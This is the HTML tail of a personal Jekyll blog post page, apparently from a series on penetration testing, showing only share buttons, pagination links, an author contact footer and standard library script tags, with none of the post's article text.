      <span class="sr-only">Twitter</span>
    </a>
  

  
    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-11-01-6.OffensivePentesting%2F"
      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
      <span class="sr-only">Facebook</span>
    </a>
  

  
    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-01-6.OffensivePentesting%2F"
      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
      <span class="sr-only">LinkedIn</span>
    </a>
  

  

  

</section>



      

      <ul class="pagination blog-pager">
        
        <li class="page-item previous">
          <a class="page-link" href="/2022-10-30-5.RedTeam/" data-toggle="tooltip" data-placement="top" title="5.RedTeam">&larr; Previous Post</a>
        </li>
        
        
        <li class="page-item next">
          <a class="page-link" href="/2022-11-02-7.BufferOverflow/" data-toggle="tooltip" data-placement="top" title="7.BufferOverflow.">Next Post &rarr;</a>
        </li>
        
      </ul>
      
  
  
  

  


  



    </div>
  </div>
</div>


  <footer>
  <div class="container-md beautiful-jekyll-footer">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
    <a href="/feed.xml" title="RSS">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">RSS</span>
    </a>
  </li><li class="list-inline-item">
    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Email me</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://github.com/Qv1nTv5" title="GitHub">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">GitHub</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://twitter.com/Qvintvs1" title="Twitter">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Twitter</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">LinkedIn</span>
   </a>
  </li></ul>

      
      <p class="copyright text-muted">
      
        Qv1nTv5
        &nbsp;&bull;&nbsp;
      
      2024

      

      
      </p>
      <p class="theme-by text-muted">
        Powered by
        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
      </p>
      </div>
    </div>
  </div>
</footer>


  
  
    
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>


  
    
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>


  
    
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>


  



  
    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
    
      <script src="/assets/js/beautifuljekyll.js"></script>
    
  









</body>
</html>
